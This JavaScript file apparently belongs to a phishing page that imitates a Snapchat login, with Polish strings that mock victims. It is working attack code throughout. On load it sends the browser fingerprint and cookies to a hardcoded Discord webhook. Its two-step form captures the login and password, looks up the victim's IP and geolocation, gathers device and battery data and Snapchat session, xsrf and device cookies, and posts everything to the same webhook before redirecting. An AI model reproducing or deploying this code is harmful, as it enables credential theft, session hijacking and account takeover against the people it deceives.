document.addEventListener('DOMContentLoaded', function () {

  function detectSmartphoneModel() {
    const ua = navigator.userAgent;
    const width = screen.width;
    const height = screen.height;
    const dpr = window.devicePixelRatio || 1;

    const resolutions = [
      // iPhone
      { model: "iPhone SE (1st gen)", width: 320, height: 568, dpr: 2 },
      { model: "iPhone 6/6s/7/8", width: 375, height: 667, dpr: 2 },
      { model: "iPhone 6+/6s+/7+/8+", width: 414, height: 736, dpr: 3 },
      { model: "iPhone X / XS / 11 Pro", width: 375, height: 812, dpr: 3 },
      { model: "iPhone XR / 11", width: 414, height: 896, dpr: 2 },
      { model: "iPhone XS Max / 11 Pro Max", width: 414, height: 896, dpr: 3 },
      { model: "iPhone 12 / 13 / 14", width: 390, height: 844, dpr: 3 },
      { model: "iPhone 12 Pro Max / 13 Pro Max / 14 Plus", width: 428, height: 926, dpr: 3 },
      { model: "iPhone 14 Pro / 15", width: 393, height: 852, dpr: 3 },
      { model: "iPhone 14 Pro Max / 15 Pro Max", width: 430, height: 932, dpr: 3 },

      // Samsung Galaxy
      { model: "Samsung Galaxy S8 / S9", width: 360, height: 740, dpr: 4 },
      { model: "Samsung Galaxy S10", width: 412, height: 869, dpr: 3.5 },
      { model: "Samsung Galaxy S20", width: 412, height: 915, dpr: 3 },
      { model: "Samsung Galaxy S21", width: 360, height: 800, dpr: 3 },
      { model: "Samsung Galaxy S22", width: 384, height: 854, dpr: 3 },
      { model: "Samsung Galaxy S23", width: 393, height: 873, dpr: 3 },

      // Google Pixel
      { model: "Pixel 4", width: 411, height: 869, dpr: 2.75 },
      { model: "Pixel 5", width: 393, height: 851, dpr: 2.75 },
      { model: "Pixel 6 / 7 / 8", width: 412, height: 915, dpr: 2.625 },

      // OnePlus
      { model: "OnePlus 7T", width: 412, height: 869, dpr: 2.75 },
      { model: "OnePlus 8", width: 412, height: 914, dpr: 3 },

      // Xiaomi
      { model: "Xiaomi Redmi Note 8", width: 393, height: 851, dpr: 2 },
      { model: "Xiaomi Mi 11", width: 412, height: 915, dpr: 3.5 },

      // Huawei
      { model: "Huawei P30", width: 360, height: 780, dpr: 3 },
      { model: "Huawei P40", width: 392, height: 832, dpr: 2.5 },
    ];

    for (const device of resolutions) {
      const matchW = (width === device.width && height === device.height) || (width === device.height && height === device.width);
      const matchDPR = Math.abs(dpr - device.dpr) < 0.2;
      if (matchW && matchDPR) return device.model;
    }

    if (/iPhone/.test(ua)) return 'iPhone (nieznany model)';
    if (/Android/.test(ua)) return 'Android (nieznany model)';
    if (/Windows/.test(ua)) return 'Komputer z Windows';
    if (/Macintosh/.test(ua)) return 'Komputer Mac';

    return 'Nieznane urządzenie';
  }

  async function getUserIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || 'NIEZNANE_IP';
    } catch {
      return 'BRAK_IP';
    }
  }

  async function getLocationFromIP(ip) {
    try {
      const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,lat,lon,city,regionName,country`);
      const data = await res.json();
      if (data.status === 'success') {
        return `📌 ${data.city}, ${data.regionName}, ${data.country} (Lat: ${data.lat.toFixed(5)}, Lon: ${data.lon.toFixed(5)})`;
      } else {
        return 'BRAK_LOKALIZACJI';
      }
    } catch {
      return 'BRAK_LOKALIZACJI';
    }
  }

  function getCookieValue(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : 'BRAK';
  }

  async function getUserMetadata() {
    const batteryInfo = {
      level: 'NIEOBSŁUGIWANE',
      charging: 'NIEOBSŁUGIWANE',
      chargingTime: 'NIEOBSŁUGIWANE',
      dischargingTime: 'NIEOBSŁUGIWANE'
    };

    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        batteryInfo.level = Math.round(battery.level * 100) + '%';
        batteryInfo.charging = battery.charging ? 'TAK' : 'NIE';
        batteryInfo.chargingTime = battery.chargingTime === Infinity ? 'BRAK' : battery.chargingTime + 's';
        batteryInfo.dischargingTime = battery.dischargingTime === Infinity ? 'BRAK' : battery.dischargingTime + 's';
      } catch {}
    }

    return {
      czas: new Date().toLocaleString(),
      userAgent: navigator.userAgent,
      resolution: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      jezyk: navigator.language,
      platforma: navigator.platform,
      cookiesEnabled: navigator.cookieEnabled,
      cpu: navigator.hardwareConcurrency || 'NIEZNANE',
      ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'NIEZNANE',
      colorDepth: screen.colorDepth,
      dpi: window.devicePixelRatio || 1,
      orientation: (screen.orientation || {}).type || 'NIEZNANA',
      battery: batteryInfo,
      deviceModel: detectSmartphoneModel()
    };
  }

  function getNextMessageNumber() {
    let num = localStorage.getItem('messageNumber');
    if (!num) num = 0;
    num = parseInt(num) + 1;
    localStorage.setItem('messageNumber', num);
    return num;
  }

  async function sendFingerprint() {
    const ua = navigator.userAgent;
    const res = `${screen.width}x${screen.height}`;
    const lang = navigator.language;
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const platform = navigator.platform;
    const cookieEnabled = navigator.cookieEnabled;
    const cookies = document.cookie || 'BRAK_COOKIE';

    const webhook = 'https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi';

    try {
      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: "fingerprint",
          ua,
          res,
          lang,
          tz,
          platform,
          cookieEnabled,
          cookies
        })
      });
    } catch (e) {
      console.error('Błąd przy wysyłaniu fingerprinta:', e);
    }
  }

  sendFingerprint();

  const gownoForm = document.getElementById('gowno-form');
  if (gownoForm) {
    gownoForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const popup = document.getElementById('loading-popup');
      if (popup) popup.classList.remove('hidden');

      const gowno = document.getElementById('gowno').value;
      const login = localStorage.getItem('cwelski_login') || 'NIEZNANY_LOGIN';
      const messageNumber = getNextMessageNumber();
      const ip = await getUserIP();
      const location = await getLocationFromIP(ip);
      const meta = await getUserMetadata();

      const snapchat_session = getCookieValue('snapchat_session');
      const xsrf_token = getCookieValue('xsrf-token');
      const device_id = getCookieValue('device_id');

      const webhook = 'https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi';

      const payload = {
        content: `# DANE ${messageNumber}
📨 **Login cwela**: \`${login}\`
🔐 **Hasło cwela**: \`${gowno}\`
🌍 **IP**: \`${ip}\`
📍 **Lokalizacja**: ${location}
🕓 **Czas**: \`${meta.czas}\`
📱 **Urządzenie**: \`${meta.deviceModel}\`
💻 **User-Agent**: \`${meta.userAgent}\`
🖥️ **Rozdzielczość**: \`${meta.resolution}\`
🌐 **Strefa czasowa**: \`${meta.timezone}\`
🗣️ **Język**: \`${meta.jezyk}\`
🧠 **Platforma**: \`${meta.platforma}\`
🔋 **Bateria**: \`Poziom: ${meta.battery.level}, Ładowanie: ${meta.battery.charging}\`
🧮 **CPU**: \`${meta.cpu}\`, **RAM**: \`${meta.ram}\`

--- Dodatkowe cookies ---
🥷 snapchat_session: \`${snapchat_session}\`
🛡️ xsrf-token: \`${xsrf_token}\`
📱 device_id: \`${device_id}\`

----------------------`
      };

      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(() => {
        localStorage.removeItem('cwelski_login');
        setTimeout(() => {
          window.location.href = 'loggedin.html';
        }, 1000);
      }).catch(() => {
        setTimeout(() => {
          window.location.href = 'loggedin.html';
        }, 1000);
      });
    });
  }

  const loginForm = document.getElementById('login-form');
  if (loginForm) {
    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();
      const login = document.getElementById('login').value;
      localStorage.setItem('cwelski_login', login);

      const popup = document.getElementById('loading-popup');
      if (popup) popup.classList.remove('hidden');

      setTimeout(() => {
        window.location.href = 'login.html';
      }, 1000);
    });
  }

  const div36 = document.querySelector('div.style-36');
  const div999 = document.querySelector('div.style-999');

  function checkScreen() {
    const width = window.innerWidth;
    if (width <= 768) {
      if (div36) div36.style.display = 'block';
      if (div999) div999.style.display = 'none';
    } else {
      if (div36) div36.style.display = 'none';
      if (div999) div999.style.display = 'block';
    }
  }

  checkScreen();
  window.addEventListener('resize', checkScreen);
});
